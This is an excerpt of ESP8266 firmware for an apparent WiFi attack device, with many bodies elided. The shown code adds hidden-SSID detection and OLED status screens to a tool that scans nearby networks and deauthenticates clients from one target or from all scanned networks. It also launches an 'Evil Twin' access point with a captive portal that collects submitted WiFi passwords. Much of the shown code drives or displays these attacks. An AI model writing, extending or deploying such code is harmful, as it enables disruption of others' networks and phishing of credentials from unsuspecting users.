...
typedef struct {
  ...
  int32_t rssi;
  String security;
  bool hidden; // --- NEW/MODIFIED FEATURE: Hidden SSID Detection ---
} _Network;
...
struct AppSettings {
  ...
  int oledDisplayMode; // --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
};
...
enum OledMode {
  ...
  MODE_ATTACK_STATS,
  MODE_NETWORK_SCAN,
  MODE_MAX // Keep this last for cycling
};
String oledModeNames[] = {"Idle Info", "Attack Stats", "Network Scan"}; // For display
...
// --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
void handleApiSetOledMode(); // API to change OLED mode
  ...
  if (deauthing_active) {
    ...
    if (deauth_all_ssids) { // If deauth all SSIDs is active
      if (millis() - lastDeauthAllTime >= deauthInterval) {
        ...
        int numNetworks = 0;
        for(int i = 0; i < 16; ++i) {
            if(_networks[i].ssid == "" && _networks[i].ch == 0) break; // Check both SSID and channel to ensure it's a valid entry
            numNetworks++;
        }
        ...
        if (numNetworks > 0) {
          ...
          if (targetNetwork.ssid != "" || targetNetwork.hidden) { // Make sure it's a valid network entry (hidden or not)
      ...
      if (_selectedNetwork.ssid != "" || _selectedNetwork.hidden) { // Check if a network is selected (hidden or not)
...
void clearNetworkArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = {"", 0, {0, 0, 0, 0, 0, 0}, 0, "", false}; // --- MODIFIED: Initialize hidden flag ---
  }
}

void performScan() {
  if (appSettings.enableDebugLogs) Serial.println("[SCAN] Starting WiFi scan...");
  int n = WiFi.scanNetworks(false, true); // true to show hidden SSIDs
  clearNetworkArray();
  if (n > 0) {
    if (appSettings.enableDebugLogs) {
    ...
    for (int i = 0; i < n && i < 16; ++i) {
      ...
      network.hidden = (network.ssid.length() == 0); // --- NEW/MODIFIED FEATURE: Hidden SSID Detection ---
      _networks[i] = network;
      if (appSettings.enableDebugLogs) {
        Serial.printf("[SCAN] %d: %s%s, Ch: %d, RSSI: %d, BSSID: %s, Security: %s\n",
                      i + 1, network.ssid.c_str(), network.hidden ? " (Hidden)" : "", network.ch, network.rssi,
...
void handleApiScan() {
  ...
  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "" && _networks[i].ch == 0) { // Check both SSID and channel to ensure it's a valid entry
      break;
    }
    ...
    networkObj["hidden"] = _networks[i].hidden; // --- NEW/MODIFIED FEATURE: Hidden SSID Detection ---
  }
  ...
  if (webServer.hasArg("plain")) {
    ...
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        ...
        found = true;
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Selected network: " + _selectedNetwork.ssid + (_selectedNetwork.hidden ? " (Hidden)" : ""));
        break;
      }
    }
...
void handleApiToggleDeauth() {
  if (webServer.hasArg("plain")) {
    ...
    if (targetAll) {
      ...
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Deauthentication " + String(deauthing_active ? "started" : "stopped") + " for " + (_selectedNetwork.hidden ? "(Hidden) " + bytesToStr(_selectedNetwork.bssid, 6) : _selectedNetwork.ssid));
    }
...
void handleApiToggleHotspot() {
  if (_selectedNetwork.ssid != "" || _selectedNetwork.hidden) { // Check if a network is selected (hidden or not)
    ...
    if (hotspot_active) {
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      // If hidden, use BSSID as SSID for AP, otherwise use actual SSID
      String apSsid = _selectedNetwork.hidden ? bytesToStr(_selectedNetwork.bssid, 6) : _selectedNetwork.ssid;
      WiFi.softAP(apSsid.c_str()); 
      dnsServer.start(DNS_PORT, "*", apIP);
      evilTwinStartTime = millis(); // Start Evil Twin timer
      lastCapturedCredential = "None"; // Reset last captured credential
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Evil Twin hotspot started for: " + apSsid);
    } else {
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
...
void handleApiDeselectNetwork() {
  _selectedNetwork = {"", 0, {0, 0, 0, 0, 0, 0}, 0, "", false}; // --- MODIFIED: Initialize hidden flag ---
  deauthing_active = false;
...
void handleCaptivePortalSubmit() {
  if (webServer.hasArg("password")) {
    ...
    String response = "<!DOCTYPE html><html><head><title>Thank You! </title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
...
void loadSettings() {
  ...
  appSettings.oledDisplayMode = MODE_IDLE_INFO; // --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
  ...
  if (SPIFFS.exists(SETTINGS_FILE)) {
    ...
    if (settingsFile) {
      ...
      if (!error) {
        ...
        appSettings.oledDisplayMode = doc["oledDisplayMode"] | appSettings.oledDisplayMode; // --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
...
void saveSettings() {
  ...
  if (settingsFile) {
    ...
    doc["oledDisplayMode"] = appSettings.oledDisplayMode; // --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
...
void handleApiSaveSettings() {
  if (webServer.hasArg("plain")) {
    ...
    int newOledDisplayMode = doc["oledDisplayMode"] | appSettings.oledDisplayMode; // --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
    ...
    appSettings.oledDisplayMode = newOledDisplayMode; // --- NEW/MODIFIED FEATURE: Customizable Display Modes ---
...
void handleApiSetOledMode() {
  if (webServer.hasArg("plain")) {
    ...
    String modeAction = doc["mode"] | "";
    if (modeAction == "cycle") {
      appSettings.oledDisplayMode = (appSettings.oledDisplayMode + 1) % MODE_MAX;
      saveSettings(); // Save the new mode
      if (appSettings.enableDebugLogs) Serial.printf("[OLED] Cycled OLED mode to %d (%s)\n", appSettings.oledDisplayMode, oledModeNames[appSettings.oledDisplayMode].c_str());
      webServer.send(200, "application/json", "{\"success\": true, \"new_mode\": " + String(appSettings.oledDisplayMode) + "}");
    } else {
      int newMode = doc["mode"].as<int>();
      if (newMode >= 0 && newMode < MODE_MAX) {
        appSettings.oledDisplayMode = newMode;
        saveSettings(); // Save the new mode
        if (appSettings.enableDebugLogs) Serial.printf("[OLED] Set OLED mode to %d (%s)\n", appSettings.oledDisplayMode, oledModeNames[appSettings.oledDisplayMode].c_str());
        webServer.send(200, "application/json", "{\"success\": true, \"new_mode\": " + String(appSettings.oledDisplayMode) + "}");
      } else {
        webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid OLED mode\"}");
      }
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
...
void updateOLEDDisplay() {
  ...
  // Right-align mode name
  String modeName = oledModeNames[appSettings.oledDisplayMode];
  display.setCursor(SCREEN_WIDTH - (modeName.length() * 6), 0); // 6 pixels per char
  display.print(modeName);
  // display.drawFastHLine(0, 8, SCREEN_WIDTH, SSD1306_WHITE); // Separator line

  // --- MAIN CONTENT AREA ---
  switch (appSettings.oledDisplayMode) {
    case MODE_IDLE_INFO: {
      // Recustomized Idle Info Display
      display.setCursor(0, 12);
      display.print("Status: ");
      if (deauthing_active) {
        display.print("DEAUTH ");
        display.print(deauth_all_ssids ? "ALL" : "ON");
      } else if (hotspot_active) {
        display.print("EVIL TWIN ON");
      } else {
        display.print("IDLE");
      }
      ...
      if (deauth_all_ssids) {
        display.print("All Scanned");
      } else if (_selectedNetwork.ssid != "" || _selectedNetwork.hidden) {
        String targetSsid = _selectedNetwork.hidden ? "(Hidden)" : _selectedNetwork.ssid;
        if (targetSsid.length() > 12) targetSsid = targetSsid.substring(0, 12) + "...";
      ...
      // display.setCursor(SCREEN_WIDTH / 2 + 10, 36); // Adjust position (DIKOMENTARI)
      // display.print("IP: "); // (DIKOMENTARI)
      // display.print(WiFi.softAPIP().toString().substring(8)); // Show last part of IP (DIKOMENTARI)

      display.setCursor(0, 48);
      display.print("Heap: ");
      display.print(ESP.getFreeHeap() / 1024);
      display.print("KB (");
      const size_t TOTAL_HEAP_ESTIMATE = 80 * 1024; // Approx total heap for ESP8266
      int memoryUsagePercent = (100.0 * (TOTAL_HEAP_ESTIMATE - ESP.getFreeHeap())) / TOTAL_HEAP_ESTIMATE;
      display.print(memoryUsagePercent);
      display.print("%)");
    ...
    case MODE_ATTACK_STATS: {
      // Panel 1: Deauth Status
      display.setCursor(0, 12);
      display.print("DEAUTH: ");
      if (deauthing_active) {
        display.print("ACTIVE ");
        display.print(deauth_all_ssids ? "ALL" : "TARGETED");
        display.setCursor(0, 24);
        display.print("Pkts: ");
        ...
        if (deauth_all_ssids) {
            display.setCursor(0, 36);
            display.print("ScanIdx: ");
            int numNetworks = 0;
            for(int i = 0; i < 16; ++i) {
                if(_networks[i].ssid == "" && _networks[i].ch == 0) break;
                numNetworks++;
            }
            ...
            display.print(" SSID: ");
            String targetSsid = _selectedNetwork.hidden ? "(Hidden)" : _selectedNetwork.ssid;
            if (targetSsid.length() > 8) targetSsid = targetSsid.substring(0, 8) + "...";
            display.print(targetSsid);
        }
      } else {
      ...
      if (hotspot_active) {
        ...
        unsigned long etSeconds = (millis() - evilTwinStartTime) / 1000;
        display.print(etSeconds);
        display.print("s");
      } else {
        display.print("INACTIVE");
      }
    ...
    case MODE_NETWORK_SCAN: {
      ...
      display.print(numNetworks);
      // display.drawFastHLine(0, 22, SCREEN_WIDTH, SSD1306_WHITE); // Separator

      // Panel 2: Top 3 Networks
      for (int i = 0; i < 3; ++i) {
        if (_networks[i].ssid != "" || _networks[i].hidden) {
          display.setCursor(0, 26 + (i * 12)); // Adjust Y position for spacing
          String ssidDisplay = _networks[i].hidden ? "(Hidden)" : _networks[i].ssid;
          if (ssidDisplay.length() > 10) ssidDisplay = ssidDisplay.substring(0, 10) + "...";
          display.print(ssidDisplay);
          display.print(" ");
          display.print(_networks[i].rssi);
          display.print("dBm");

          // Signal Bar (Graphical)
          int signalBarWidth = map(_networks[i].rssi, -100, -30, 0, 30); // Max 30 pixels wide
          signalBarWidth = constrain(signalBarWidth, 0, 30);
          display.drawRect(SCREEN_WIDTH - 35, 26 + (i * 12), 35, 8, SSD1306_WHITE); // Outline
          display.fillRect(SCREEN_WIDTH - 34, 27 + (i * 12), signalBarWidth, 6, SSD1306_WHITE); // Fill
        } else {
  ...
  // --- FOOTER ---
  // display.drawFastHLine(0, SCREEN_HEIGHT - 12, SCREEN_WIDTH, SSD1306_WHITE); // Separator line
